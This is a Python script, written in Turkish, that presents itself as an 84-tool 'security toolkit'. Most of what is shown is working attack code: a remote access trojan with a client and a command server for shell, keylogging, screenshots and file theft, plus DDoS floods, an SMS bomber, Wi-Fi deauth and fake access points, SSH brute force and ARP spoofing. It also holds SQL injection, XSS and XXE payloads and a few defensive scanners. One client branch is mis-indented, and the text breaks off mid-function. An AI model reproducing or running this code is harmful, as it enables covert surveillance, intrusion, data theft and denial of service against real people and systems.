#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  ETT ETERNETLOG 2026 v7.0 - 84 Arac Security Toolkit
#  Creator  : @markos39
#  Calistir : python3 etternetlog_v7.py
#  Root     : GEREKMEZ (root isteyen arac otomatik sudo kullanir)
#  Ortam    : Kali / Parrot / Linux (Python 3.9+)
# ============================================================
import os, sys, time, socket, threading, subprocess, hashlib, json, re
import random, base64, math, collections, datetime, ipaddress, itertools
import shutil, urllib.request, urllib.error, urllib.parse, ssl, io

VERSION = "2026 v7.0"
CREATOR = "@markos39"

# ==================== RENKLER (ANSI) ====================
RST="\033[0m"; BLD="\033[1m"; DIM="\033[2m"
RED="\033[91m"; GRN="\033[92m"; YEL="\033[93m"
BLU="\033[94m"; MAG="\033[95m"; CYN="\033[96m"; WHT="\033[97m"
SIY="\033[30m"; SIYAR="\033[40m"; KALIN="\033[1m"

def c(txt, col=RST, bold=False):
    return (BLD if bold else "") + col + str(txt) + RST
def ok(msg):   print(c(msg, GRN))
def err(msg):  print(c(msg, RED))
def warn(msg): print(c(msg, YEL))
def info(msg): print(c(msg, CYN))

def _ct(ln, fill=SIYAR+KALIN):
    return fill + " " + ln + " " + RST

def _thick_banner(word):
    G = {
        "E": ["████████","████────","████────","████████","████────","████────","████████"],
        "T": ["████████","────██────","────██────","────██────","────██────","────██────","────██────"],
        "R": ["██████──","████──██","████──██","██████──","████─██─","████──██","████──██"],
        "N": ["████──██","████─███","████████","███─██─██","███──████","███──████","███──████"],
        "L": ["████────","████────","████────","████────","████────","████────","████████"],
        "O": ["─█████──","██───██","██───██","██───██","██───██","██───██","─█████──"],
        "G": ["─██████","██─────","██─────","██─████","██───██","██───██","─██████"],
    }
    rows = [""]*7
    for ch in str(word).upper():
        for i in range(7):
            rows[i] += _ct(G.get(ch, G["E"])[i])
    return "\n".join(rows)

def banner():
    art = None
    try:
        from pyfiglet import Figlet
        for f in ("block","doh","roman","banner3-D"):
            try:
                a = Figlet(font=f, width=250).renderText("ETTERNETLOG").rstrip("\n")
                if a.strip(): art=a; break
            except Exception: continue
    except Exception:
        pass
    if not art:
        art = _thick_banner("ETTERNETLOG")
    else:
        art = "\n".join(SIY+KALIN+l+RST for l in art.splitlines())
    print(art); print()
    h = SIYAR+KALIN
    print(c("="*78, h)+RST)
    print(c("  ETT ETERNETLOG", h, True) + c(" v7.0 | Security Toolkit | 84 Arac", YEL, True))
    print(c("  Creator : ", h, True) + c(CREATOR, RED, True) + c("  |  Kali / Parrot / Linux", WHT))
    print(c("  Root gerektiren arac otomatik sudo kullanir", DIM))
    print(c("="*78, h)+RST)

# ==================== YARDIMCILAR ====================
def shu(cmd, sudo=True):
    if sudo and os.geteuid()!=0: cmd="sudo "+cmd
    os.system(cmd)

def http_status(url):
    try:
        req=urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
        return urllib.request.urlopen(req, timeout=8).getcode()
    except urllib.error.HTTPError as e: return e.code
    except Exception: return None

def fetch(url, data=None, method=None, ctype=None):
    hdr={"User-Agent":"Mozilla/5.0"}
    if ctype: hdr["Content-Type"]=ctype
    req=urllib.request.Request(url, data=data, headers=hdr, method=method)
    try:
        return urllib.request.urlopen(req, timeout=10).read().decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8","ignore")
    except Exception:
        return ""

# ==================== FLOOD ====================
def http_flood(ip,port,dur,threads):
    stop=time.time()+dur
    paths=["/","/index.html","/login","/api","/?q=%d"%random.randint(0,9999)]
    def w():
        while time.time()<stop:
            try:
                s=socket.create_connection((ip,port),timeout=3)
                s.send(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"%(random.choice(paths),ip)).encode()); s.close()
            except Exception: pass
    ts=[threading.Thread(target=w) for _ in range(threads)]
    [t.start() for t in ts]; [t.join() for t in ts]
    ok("[+] HTTP flood bitti")

def udp_flood(ip,port,dur,threads):
    stop=time.time()+dur; pay=os.urandom(1024)
    def w():
        while time.time()<stop:
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.sendto(pay,(ip,port)); s.close()
            except Exception: pass
    ts=[threading.Thread(target=w) for _ in range(threads)]
    [t.start() for t in ts]; [t.join() for t in ts]
    ok("[+] UDP flood bitti")

def tcp_flood(ip,port,dur,threads):
    stop=time.time()+dur
    def w():
        while time.time()<stop:
            try:
                s=socket.socket(); s.settimeout(2); s.connect((ip,port)); s.send(b"\x00"*512); s.close()
            except Exception: pass
    ts=[threading.Thread(target=w) for _ in range(threads)]
    [t.start() for t in ts]; [t.join() for t in ts]
    ok("[+] TCP flood bitti")

def syn_flood(ip,port,dur):
    if not shutil.which("hping3"): warn("[*] hping3 yok -> TCP fallback"); return False
    shu("timeout %d hping3 -S --flood -p %d %s > /dev/null 2>&1"%(dur,port,ip)); ok("[+] SYN flood bitti"); return True

def icmp_flood(ip,dur):
    shu("timeout %d ping -f -c 1000000 %s > /dev/null 2>&1"%(dur,ip)); ok("[+] ICMP flood bitti")

# ==================== GERCEK RAT CLIENT ====================
def write_rat_client(out):
    CLIENT = r'''#!/usr/bin/env python3
import socket, subprocess, os, base64, sys, time, threading, platform, json, io
HOST=sys.argv[1] if len(sys.argv)>1 else "127.0.0.1"
PORT=int(sys.argv[2]) if len(sys.argv)>2 else 4444
def recv_exact(c,n):
    b=b""
    while len(b)<n:
        d=c.recv(n-len(b))
        if not d: raise ConnectionError()
        b+=d
    return b
def recv_msg(c): return recv_exact(c,int.from_bytes(recv_exact(c,4),"big"))
def send_msg(c,d):
    if isinstance(d,str): d=d.encode()
    c.sendall(len(d).to_bytes(4,"big")+d)
def get_imei():
    try:
        if os.path.exists("/system/build.prop"):
            for l in open("/system/build.prop",errors="ignore"):
                if "gsm.serial" in l: return l.split("=",1)[1].strip()
        return platform.node()
    except Exception: return platform.node()
def screenshot():
    try:
        from PIL import ImageGrab
        return ImageGrab.grab().convert("RGB")
    except Exception: return None
KEYS=[]; logging=False
def keylog_worker():
    try:
        from pynput import keyboard
        def on_press(k):
            global KEYS
            try: v=k.char
            except Exception: v=str(k)
            KEYS.append(v)
        with keyboard.Listener(on_press=on_press) as lst: lst.join()
    except Exception: pass
def main_loop():
    global KEYS, logging
    hid=get_imei()
    while True:
        try:
            c=socket.create_connection((HOST,PORT),timeout=8)
            send_msg(c,hid)
            if recv_msg(c)!=b"OK": c.close(); continue
            send_msg(c,"INFO:"+platform.platform()+"|user="+os.getenv("USER","?"))
            while True:
                cmd=recv_msg(c).decode("utf-8","ignore")
                if cmd=="quit": return
                elif cmd=="screen":
                    img=screenshot()
                    if img:
                        b=io.BytesIO(); img.save(b,"PNG")
                        send_msg(c,"RES:IMG:"+base64.b64encode(b.getvalue()).decode())
                    else: send_msg(c,"RES:no-screen")
                elif cmd=="keys":
                    if not logging:
                        logging=True; threading.Thread(target=keylog_worker,daemon=True).start()
                    send_msg(c,"RES:keylog-started")
                elif cmd=="keys_get":
                    send_msg(c,"RES:KEYS:"+base64.b64encode(json.dumps(KEYS).encode()).decode()); KEYS=[]
                elif cmd=="keys_off":
                    logging=False; send_msg(c,"RES:keylog-off")
                elif cmd.startswith("msg "):
                    m=cmd[4:]
                    subprocess.Popen(["zenity","--info","--text="+m]) if not sys.platform.startswith("win") else subprocess.Popen(["powershell","-c","Add-Type -AssemblyName PresentationFramework;[System.Windows.Forms.MessageBox]::Show('"+m+"')"])
                    send_msg(c,"RES:msg-sent")
                elif cmd.startswith("download "):
                    n=cmd.split(" ",1)[1]
                    try:
                        d=base64.b64encode(open(n,"rb").read()).decode(); send_msg(c,"RES:DLFILE:"+d)
                    except Exception as e: send_msg(c,"RES:dl-err:"+str(e))
                elif cmd.startswith("upload "):
                    _,name,data64=cmd.split(" ",2)
                    try: open(name,"wb").write(base64.b64decode(data64)); send_msg(c,"RES:up-ok:"+name)
                    except Exception as e: send_msg(c,"RES:up-err:"+str(e))
                elif cmd.startswith("shell "): cmd=cmd[6:]
                    try:
                        r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=30)
                        send_msg(c,"RES:"+((r.stdout+r.stderr)[:4000] or "(bos)"))
                    except Exception as e: send_msg(c,"RES:err:"+str(e))
        except Exception: time.sleep(5)
main_loop()
'''
    with open(out,"w") as f: f.write(CLIENT)
    os.chmod(out,0o755)

def rat_server(port, imei_filter=None):
    def recv_exact(c,n):
        b=b""
        while len(b)<n:
            x=c.recv(n-len(b))
            if not x: raise ConnectionError()
            b+=x
        return b
    def recv_msg(c): return recv_exact(c,int.from_bytes(recv_exact(c,4),"big"))
    def send_msg(c,d):
        if isinstance(d,str): d=d.encode()
        c.sendall(len(d).to_bytes(4,"big")+d)
    class Agent:
        def __init__(self,cid,conn,addr):
            self.id=cid; self.conn=conn; self.addr=addr; self.alive=True; self.dlpath=None
            threading.Thread(target=self.listen,daemon=True).start()
        def listen(self):
            while self.alive:
                try: cmd=recv_msg(self.conn).decode("utf-8","ignore")
                except Exception: self.alive=False; break
                if cmd=="BYE": self.alive=False
                elif cmd.startswith("RES:IMG:"):
                    try:
                        raw=base64.b64decode(cmd[len("RES:IMG:"):])
                        pf="screen_%s_%d.png"%(self.id,int(time.time()))
                        open(pf,"wb").write(raw); ok("  [screen] %s -> %s (%d KB)"%(self.id,pf,len(raw)//1024))
                    except Exception as e: err("  [screen] hata: %s"%e)
                elif cmd.startswith("RES:KEYS:"):
                    try:
                        ks=json.loads(base64.b64decode(cmd[len("RES:KEYS:"):]).decode())
                        warn("  [keys] %s: %s"%(self.id,"".join(ks)[:300]))
                    except Exception: pass
                elif cmd.startswith("RES:DLFILE:"):
                    try:
                        raw=base64.b64decode(cmd[len("RES:DLFILE:"):])
                        if self.dlpath: open(self.dlpath,"wb").write(raw); ok("  [%s] indirildi: %s (%d byte)"%(self.id,self.dlpath,len(raw))); self.dlpath=None
                    except Exception as e: err("  [%s] dl hata: %s"%(self.id,e))
                elif cmd.startswith("RES:"):
                    print(c("  [%s] %s"%(self.id,cmd[4:][:500]),WHT))
                elif cmd.startswith("INFO:"):
                    ok("  [info] %s"%cmd[5:][:80])
            try: self.conn.close()
            except Exception: pass
            warn("  [-] Agent bitti: %s"%self.id)
        def send(self,cmd):
            try: send_msg(self.conn,cmd); return True
            except Exception: return False
    server={}
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(("0.0.0.0",port)); s.listen(10)
    ok("[+] RAT C2 dinliyor: 0.0.0.0:%d%s"%(port," | IMEI filtresi: %s"%imei_filter if imei_filter else ""))
    info("[*] agents | use <id> | shell <cmd> | screen | keys | keys_get | msg <metin> | upload <yerel> <uzak> | download <uzak> <yerel> | quit")
    def waiter():
        while True:
            conn,addr=s.accept()
            try:
                cid=recv_msg(conn).decode()
                if imei_filter and imei_filter.lower() not in cid.lower():
                    conn.close(); continue
                send_msg(conn,"OK")
                try: ver=recv_msg(conn).decode("utf-8","ignore")
                except Exception: ver=""
                server[cid]=Agent(cid,conn,addr)
                ok("[+] Agent: %s (%s) ver:%s | toplam: %d"%(cid,addr[0],ver[:40],len(server)))
            except Exception: conn.close()
    threading.Thread(target=waiter,daemon=True).start()
    cur=None
    while True:
        try: line=input(c("C2> ",GRN,True)).strip()
        except (EOFError,KeyboardInterrupt): break
        if not line: continue
        p=line.split()
        if p[0]=="quit": break
        elif p[0]=="agents":
            if not server: warn("  [-] Bagli agent yok")
            for i,(cid,ag) in enumerate(server.items(),1):
                print(c("  [%d] %-20s %s:%d"%(i,cid,ag.addr[0],ag.addr[1]),CYN))
        elif p[0]=="use":
            cur=server.get(p[1]) if len(p)>1 else None
            ok("[+] Secili: %s"%p[1]) if cur else err("[!] Agent YOK!")
        elif p[0]=="shell" and cur: cur.send("shell "+" ".join(p[1:]))
        elif p[0]=="screen" and cur: cur.send("screen")
        elif p[0]=="keys" and cur: cur.send("keys")
        elif p[0]=="keys_get" and cur: cur.send("keys_get")
        elif p[0]=="msg" and cur: cur.send("msg "+" ".join(p[1:]))
        elif p[0]=="upload" and cur and len(p)>=3:
            if os.path.exists(p[1]):
                cur.send("upload %s %s"%(p[2],base64.b64encode(open(p[1],"rb").read()).decode()))
            else: err("[!] Yerel dosya yok")
        elif p[0]=="download" and cur and len(p)>=3:
            cur.dlpath=p[2]; cur.send("download "+p[1])
        else: err("[!] Hatali komut / agent secili degil (agents ile bak)")
    ok("[+] C2 kapandi")

# ==================== ARAC 1-4 ====================
def tool_rat():
    print(c("\n[ 1 - RAT C2 SERVER (Ekran + Keylog) ]",CYN,True))
    act=input(c("(s)erver / (c)lient uret [s]: ",YEL)).strip().lower() or "s"
    if act=="c":
        out=input(c("Cikti dosyasi [rat_client.py]: ",YEL)).strip() or "rat_client.py"
        write_rat_client(out); ok("[+] Client uretildi: %s"%out)
        info("[*] Calistir: python3 %s <C2_IP> <PORT>"%out); return
    try:
        port=int(input(c("Dinleme portu [4444]: ",YEL)) or "4444")
    except ValueError: err("[!] Port hatali"); return
    imei=input(c("IMEI filtre (bos = hepsi): ",YEL)).strip() or None
    rat_server(port,imei)

def tool_ddos():
    print(c("\n[ 2 - DDoS ATTACK ]",CYN,True))
    target=input(c("Hedef (IP/domain): ",YEL)).strip()
    mode=input(c("Mod [http|udp|syn|tcp|icmp] (http): ",YEL)).strip() or "http"
    try:
        port=int(input(c("Port [80]: ",YEL)) or "80"); dur=int(input(c("Sure sn [10]: ",YEL)) or "10")
        threads=int(input(c("Thread [100]: ",YEL)) or "100")
    except ValueError: err("[!] Sayi hatali"); return
    try: ip=socket.gethostbyname(target)
    except Exception: err("[!] Cozumlenemedi"); return
    print(c("[!] HEDEF %s (%s) | MOD %s | SURE %d sn | THREAD %d"%(target,ip,mode,dur,threads),MAG,True))
    try:
        if mode=="http": http_flood(ip,port,dur,threads)
        elif mode=="udp": udp_flood(ip,port,dur,threads)
        elif mode=="tcp": tcp_flood(ip,port,dur,threads)
        elif mode=="icmp": icmp_flood(ip,dur)
        elif mode=="syn":
            if not syn_flood(ip,port,dur): tcp_flood(ip,port,dur,threads)
        else: warn("[!] Gecersiz mod")
    except KeyboardInterrupt: err("\n[!] Durduruldu")
    ok("[+] Test tamam")

def tool_sms():
    print(c("\n[ 3 - SMS BOMBER ] (yetkili testler icin)",CYN,True))
    num=input(c("Telefon (90532...): ",YEL)).strip()
    if not num.isdigit(): err("[!] Gecersiz"); return
    try:
        count=int(input(c("Mesaj adedi [5]: ",YEL)) or "5"); delay=float(input(c("Gecikme sn [1]: ",YEL)) or "1")
    except ValueError: err("[!] Sayi hatali"); return
    gws=[("textbelt","https://textbelt.com/text",{"phone":num,"message":"ETT SMS TEST MESAJI","key":"textbelt"})]
    sent=0
    for i in range(count):
        for name,url,data in gws:
            try:
                req=urllib.request.Request(url,data=urllib.parse.urlencode(data).encode(),headers={"User-Agent":"Mozilla/5.0"})
                resp=json.loads(urllib.request.urlopen(req,timeout=10).read().decode())
                if isinstance(resp,dict) and resp.get("success"): sent+=1; ok("[+] %d/%d [%s]"%(i+1,count,name))
                else: warn("[*] %d/%d red [%s]: %s"%(i+1,count,name,resp))
            except Exception as e: err("[*] %d/%d [%s] hata: %s"%(i+1,count,name,e))
        time.sleep(delay)
    ok("[+] Bitti. Basarili: %d"%sent)

def tool_wifix():
    print(c("\n[ 4 - WIFIX HACK ]",CYN,True))
    print(c("  1)",GRN,True)+c(" Monitor mod",WHT)); print(c("  2)",GRN,True)+c(" Deauth",WHT))
    print(c("  3)",GRN,True)+c(" Handshake (airodump)",WHT)); print(c("  4)",GRN,True)+c(" Sahte AP",WHT))
    print(c("  5)",GRN,True)+c(" WPS test (reaver)",WHT))
    ch=input(c("Secim: ",YEL)).strip()
    if ch=="1":
        iface=input(c("Arayuz [wlan0]: ",YEL)).strip() or "wlan0"; shu("airmon-ng start %s"%iface)
    elif ch=="2":
        iface=input(c("Arayuz [wlan0]: ",YEL)).strip() or "wlan0"
        bssid=input(c("BSSID: ",YEL)).strip(); chn=input(c("Kanal [1]: ",YEL)).strip() or "1"
        if bssid:
            shu("airmon-ng start %s %s"%(iface,chn)); shu("aireplay-ng -0 0 -a %s %smon"%(bssid,iface))
    elif ch=="3":
        iface=input(c("Arayuz [wlan0]: ",YEL)).strip() or "wlan0"; shu("airodump-ng %smon"%iface)
    elif ch=="4":
        iface=input(c("Arayuz [wlan0]: ",YEL)).strip() or "wlan0"
        ssid=input(c("SSID [ETT-FakeAP]: ",YEL)).strip() or "ETT-FakeAP"
        chn=input(c("Kanal [6]: ",YEL)).strip() or "6"
        conf="/tmp/fakeap.conf"
        open(conf,"w").write("interface=%s\ndriver=nl80211\nssid=%s\nhw_mode=g\nchannel=%s\n"%(iface,ssid,chn))
        shu("hostapd %s &"%conf); info("[*] dnsmasq: sudo dnsmasq --interface=%s --dhcp-range=10.0.0.10,10.0.0.100,12h"%iface)
        ok("[+] Sahte AP: %s | kapat: sudo pkill hostapd"%ssid)
    elif ch=="5":
        iface=input(c("Arayuz [wlan0]: ",YEL)).strip() or "wlan0"
        bssid=input(c("BSSID: ",YEL)).strip()
        if bssid: shu("reaver -i %smon -b %s -vv"%(iface,bssid))
    else: err("[!] Gecersiz")

# ==================== ARAC 5-29 (asil kume) ====================
def tool_portscan():
    print(c("\n[ 5 - PORT SCANNER ]",CYN,True))
    target=input(c("Hedef: ",YEL)).strip(); spec=input(c("Portlar [1-1000]: ",YEL)).strip() or "1-1000"
    try: ip=socket.gethostbyname(target)
    except Exception: err("[!] Cozumlenemedi"); return
    ports=set()
    for part in spec.split(","):
        part=part.strip()
        if "-" in part:
            a_,b_=part.split("-"); ports.update(range(int(a_) if a_ else 1,(int(b_) if b_ else 65535)+1))
        elif part: ports.add(int(part))
    ports=sorted(ports); info("[*] %s taranıyor (%d port)..."%(ip,len(ports)))
    from concurrent.futures import ThreadPoolExecutor
    def scan(pr):
        try:
            with socket.socket() as s:
                s.settimeout(0.6)
                return pr if s.connect_ex((ip,pr))==0 else None
        except Exception: return None
    with ThreadPoolExecutor(200) as ex: res=list(ex.map(scan,ports))
    op=[r for r in res if r]; ok("[+] Acik portlar (%d): %s"%(len(op),op))

def tool_sqli():
    print(c("\n[ 6 - SQL INJECTION SCANNER ]",CYN,True))
    url=input(c("URL (parametreli): ",YEL)).strip()
    if "?" not in url: err("[!] Parametre yok"); return
    base,qs=url.split("?",1); params=urllib.parse.parse_qsl(qs,keep_blank_values=True)
    payloads=["'",'"',"' OR '1'='1","' OR 1=1--",'" OR "1"="1',"'; DROP TABLE--","' UNION SELECT NULL--","' AND SLEEP(3)--"]
    errs=["SQL syntax","mysql","ORA-","syntax error","unclosed","PostgreSQL","SQLite","ODBC","MariaDB"]
    found=False
    for i,(k,_) in enumerate(params):
        for pl in payloads:
            new=list(params); new[i]=(k,pl); u=base+"?"+urllib.parse.urlencode(new)
            body=fetch(u)
            m=[e for e in errs if re.search(e,body,re.I)]
            if m: print(c("[!] SQLi: %s payload=%s hata=%s"%(k,pl[:20],m[0]),RED,True)); found=True; break
    if not found: info("[+] SQLi izi yok (%d parametre)"%len(params))

def tool_xss():
    print(c("\n[ 7 - XSS SCANNER ]",CYN,True))
    url=input(c("URL (parametreli): ",YEL)).strip()
    if "?" not in url: err("[!] Parametre yok"); return
    base,qs=url.split("?",1); params=urllib.parse.parse_qsl(qs,keep_blank_values=True)
    payloads=["<script>alert(1)</script>",'"><script>alert(1)</script>',"<img src=x onerror=alert(1)>","'-alert(1)-'","<svg/onload=alert(1)>"]
    found=False
    for i,(k,_) in enumerate(params):
        for pl in payloads:
            new=list(params); new[i]=(k,pl); u=base+"?"+urllib.parse.urlencode(new)
            body=fetch(u)
            if pl in body: print(c("[!] Yansiyan XSS: %s payload=%s"%(k,pl),RED,True)); found=True; break
    if not found: info("[+] Yansiyan XSS yok")

def tool_subdomain():
    print(c("\n[ 8 - SUBDOMAIN ENUM ]",CYN,True))
    dom=input(c("Domain: ",YEL)).strip().lower().strip(".")
    words=["www","mail","ftp","webmail","admin","api","dev","test","vpn","remote","ns1","ns2","mx","smtp","pop","imap","blog","shop","portal","cms","panel","dns","db","git","jenkins","grafana","kibana","old","beta","secure","intranet","support","status","cdn","cloud","m","mobile","static","docs","staging","app"]
    from concurrent.futures import ThreadPoolExecutor
    def chk(w):
        try: return w+"."+dom,socket.gethostbyname(w+"."+dom)
        except Exception: return None
    info("[*] %d alt alan deneniyor..."%len(words)); n=0
    with ThreadPoolExecutor(100) as ex:
        for r in ex.map(chk,words):
            if r: ok("[+] %s -> %s"%r); n+=1
    ok("[+] Toplam: %d"%n)

def tool_dirfuzz():
    print(c("\n[ 9 - DIRECTORY FUZZER ]",CYN,True))
    url=input(c("URL (http://site): ",YEL)).strip()
    wl=input(c("Wordlist (bos=dahili): ",YEL)).strip()
    paths=[]
    if wl and os.path.exists(wl):
        paths=[l.strip() for l in open(wl,errors="ignore") if l.strip()]
    else:
        paths=["admin","login","api","wp-admin","uploads","backup","config.php",".git","phpmyadmin","server-status","index.php","robots.txt","sitemap.xml",".env","assets","test","dev","old","private","includes","lib","data","logs","tmp","console","dashboard","panel","doc","docs"]
    from concurrent.futures import ThreadPoolExecutor
    def probe(pp):
        u=url.rstrip("/")+"/"+pp
        try:
            req=urllib.request.Request(u,headers={"User-Agent":"Mozilla/5.0"})
            r=urllib.request.urlopen(req,timeout=6); return u,r.getcode(),len(r.read())
        except urllib.error.HTTPError as e: return u,e.code,0
        except Exception: return None
    info("[*] %d hedef deneniyor..."%len(paths))
    with ThreadPoolExecutor(20) as ex:
        for r in ex.map(probe,paths):
            if r and r[1] and r[1]<400: print(c("[%d] %s (%d byte)"%(r[1],r[0],r[2]),GRN))
    ok("[+] Tarama bitti")

def tool_wpscan():
    print(c("\n[ 10 - WORDPRESS SCANNER ]",CYN,True))
    url=input(c("URL (http://site): ",YEL)).strip().rstrip("/")
    body=fetch(url+"/")
    if "wp-content" in body or "wordpress" in body.lower(): ok("[+] WordPress TESPIT EDILDI")
    else: warn("[-] WordPress degil")
    m=re.search(r'content="WordPress\s*([\d.]+)"',body) or re.search(r'ver=([\d.]+)',body)
    ok("[+] Versiyon: %s"%(m.group(1) if m else "bulunamadi"))
    for f in ("xmlrpc.php","wp-login.php","readme.html","wp-json/"):
        st=http_status(url+"/"+f)
        if st and st<400: ok("[+] Bulundu: %s (HTTP %d)"%(f,st))
    users=fetch(url+"/wp-json/wp/v2/users"); names=re.findall(r'"slug":"([^"]+)"',users)
    if names: ok("[+] Kullanicilar: %s"%", ".join(names))

def tool_hashcrack():
    print(c("\n[ 11 - HASH CRACKER ]",CYN,True))
    h=input(c("Hash: ",YEL)).strip().lower(); wl=input(c("Wordlist: ",YEL)).strip()
    if not os.path.exists(wl): err("[!] Wordlist yok"); return
    algo={32:"md5",40:"sha1",64:"sha256",128:"sha512"}.get(len(h))
    if not algo: err("[!] Bilinmeyen hash"); return
    fn={"md5":hashlib.md5,"sha1":hashlib.sha1,"sha256":hashlib.sha256,"sha512":hashlib.sha512}[algo]
    info("[+] Algo: %s"%algo.upper()); cnt=0
    for line in open(wl,errors="ignore"):
        w=line.rstrip("\r\n")
        if not w: continue
        cnt+=1
        if fn(w.encode()).hexdigest()==h: print(c("[+] KIRILDI: %s (%d deneme)"%(w,cnt),GRN,True)); return
    warn("[-] Bulunamadi (%d deneme)"%cnt)

def tool_sshbrute():
    print(c("\n[ 12 - SSH BRUTE FORCE ]",CYN,True))
    host=input(c("Hedef: ",YEL)).strip(); user=input(c("Kullanici [root]: ",YEL)).strip() or "root"
    wl=input(c("Wordlist: ",YEL)).strip()
    if not os.path.exists(wl): err("[!] Wordlist yok"); return
    try: import paramiko
    except ImportError: err("[!] paramiko gerekli: pip install paramiko"); return
    for line in open(wl,errors="ignore"):
        pw=line.strip()
        if not pw: continue
        try:
            cli=paramiko.SSHClient(); cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            cli.connect(host,port=22,username=user,password=pw,timeout=5,banner_timeout=5)
            print(c("[+] GECERLI SIFRE: %s:%s"%(user,pw),GRN,True)); cli.close(); return
        except paramiko.AuthenticationException: pass
        except Exception as e: err("[!] Baglanti hatasi: %s"%e); return
    warn("[-] Gecerli sifre yok")

def tool_xxe():
    print(c("\n[ 13 - XXE SCANNER ]",CYN,True))
    url=input(c("URL (XML servis): ",YEL)).strip()
    payload='<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<foo>&xxe;</foo>'
    try:
        req=urllib.request.Request(url,data=payload.encode(),headers={"Content-Type":"application/xml","User-Agent":"Mozilla/5.0"})
        body=urllib.request.urlopen(req,timeout=10).read().decode("utf-8","ignore")
        if "root:x:0:0" in body: print(c("[!] XXE ACIGI TESPIT EDILDI!",RED,True))
        else: info("[+] Bariz XXE yok")
    except Exception as e: err("[!] Hata: %s"%e)

def tool_arp():
    print(c("\n[ 14 - ARP SPOOFER ]",CYN,True))
    if not shutil.which("arpspoof"): err("[!] arpspoof yok: sudo apt install dsniff"); return
    target=input(c("Hedef IP: ",YEL)).strip(); gw=input(c("Gateway IP: ",YEL)).strip()
    iface=input(c("Arayuz [eth0]: ",YEL)).strip() or "eth0"
    shu("sysctl -w net.ipv4.ip_forward=1"); ok("[+] IP forward acik. Spoofing basladi (Ctrl+C)...")
    try:
        shu("arpspoof -i %s -t %s %s &"%(iface,target,gw),False)
        shu("arpspoof -i %s -t %s %s &"%(iface,gw,target),False)
        time.sleep(999999)
    except KeyboardInterrupt: err("\n[!] Durduruldu")
    finally:
        os.system("pkill -f arpspoof"); shu("sysctl -w net.ipv4.ip_forward=0"); ok("[+] Temizlendi")

def tool_loganalyzer():
    print(c("\n[ 15 - LOG ANALYZER ]",CYN,True))
    fp=input(c("Log dosyasi: ",YEL)).strip()
    if not os.path.exists(fp): err("[!] Yok"); return
    pats={"ERROR":re.compile(r"ERROR|CRITICAL|FATAL",re.I),"FAILED_LOGIN":re.compile(r"Failed password|authentication failure|login failed",re.I),"SQLI":re.compile(r"(%27)|(')|(--)|(%23)|(#)",re.I),"XSS":re.compile(r"<script|javascript:|onerror=",re.I),"PRIV_ESC":re.compile(r"sudo|su -|chmod 777|chown root",re.I)}
    res=collections.defaultdict(list)
    for i,line in enumerate(open(fp,errors="ignore"),1):
        for name,p in pats.items():
            if p.search(line): res[name].append((i,line.strip()))
    ok("[+] Eslesme: %d"%sum(len(v) for v in res.values()))
    for cat,items in sorted(res.items()):
        warn("[!] %s: %d eslesme"%(cat,len(items)))
        for no,l in items[:3]: print(c("   Satir %d: %s"%(no,l[:90]),WHT))

def tool_fim():
    print(c("\n[ 16 - FILE INTEGRITY MONITOR ]",CYN,True))
    d=input(c("Dizin: ",YEL)).strip()
    if not os.path.isdir(d): err("[!] Dizin yok"); return
    db=".fim_db.json"
    def hf(p):
        h=hashlib.sha256()
        for chunk in iter(lambda:open(p,"rb").read(8192),b""): h.update(chunk)
        return h.hexdigest()
    def scan():
        out={}
        for r,_,fs in os.walk(d):
            for fn in fs:
                try: out[os.path.join(r,fn)]=hf(os.path.join(r,fn))
                except Exception: pass
        return out
    if not os.path.exists(db):
        json.dump(scan(),open(db,"w"),indent=2); ok("[+] Baseline: %s"%db); return
    base=json.load(open(db)); cur=scan()
    for f in cur:
        if f in base and base[f]!=cur[f]: err("[CHANGED] %s"%f)
        if f not in base: warn("[NEW] %s"%f)
    for f in base:
        if f not in cur: warn("[MISSING] %s"%f)
    ok("[+] Kontrol tamam.")

def tool_ssl():
    print(c("\n[ 17 - SSL/TLS CHECKER ]",CYN,True))
    host=input(c("Host: ",YEL)).strip()
    try:
        ctx=ssl.create_default_context()
        with socket.create_connection((host,443),timeout=5) as sock:
            with ctx.wrap_socket(sock,server_hostname=host) as ss:
                cert=ss.getpeercert()
                exp=datetime.datetime.fromtimestamp(ssl.cert_time_to_seconds(cert["notAfter"]),tz=datetime.timezone.utc)
                days=(exp-datetime.datetime.now(datetime.timezone.utc)).days
                ok("[+] Protokol: %s | Cipher: %s"%(ss.version(),ss.cipher()[0]))
                ok("[+] Bitis: %s (%d gun)"%(cert["notAfter"],days))
                if days<30: warn("[!] UYARI: Sertifika yakinda bitiyor!")
    except Exception as e: err("[!] Hata: %s"%e)

def tool_passcheck():
    print(c("\n[ 18 - PASSWORD STRENGTH ]",CYN,True))
    pw=input(c("Sifre: ",YEL))
    chk={"len>=12":len(pw)>=12,"upper":bool(re.search(r"[A-Z]",pw)),"lower":bool(re.search(r"[a-z]",pw)),"digit":bool(re.search(r"\d",pw)),"special":bool(re.search(r"[^A-Za-z0-9]",pw))}
    score=sum(chk.values()); ent=len(pw)*math.log2(94) if pw else 0
    info("[+] Skor: %d/5 | Entropi: %.1f bit"%(score,ent))
    for k,v in chk.items(): print(c("   %s %s"%("[OK]" if v else "[FAIL]",k),GRN if v else RED))
    if score<3 or ent<40: err("[!] ZAYIF")
    elif score<5: warn("[*] ORTA")
    else: ok("[+] GUCLU")

def tool_yara():
    print(c("\n[ 19 - YARA SCANNER ]",CYN,True))
    pth=input(c("Yol: ",YEL)).strip()
    if not os.path.exists(pth): err("[!] Yok"); return
    rules={"suspicious":[b"cmd.exe",b"powershell.exe",b"/bin/sh",b"eval("],"pe_header":re.compile(b"MZ"),"pdf_js":re.compile(b"/JavaScript|/JS",re.I)}
    targets=[pth] if os.path.isfile(pth) else [os.path.join(r,fn) for r,_,fs in os.walk(pth) for fn in fs]
    for fp in targets:
        try:
            data=open(fp,"rb").read(); hits=[]
            for name,pat in rules.items():
                if isinstance(pat,list):
                    if any(p in data for p in pat): hits.append(name)
                elif pat.search(data): hits.append(name)
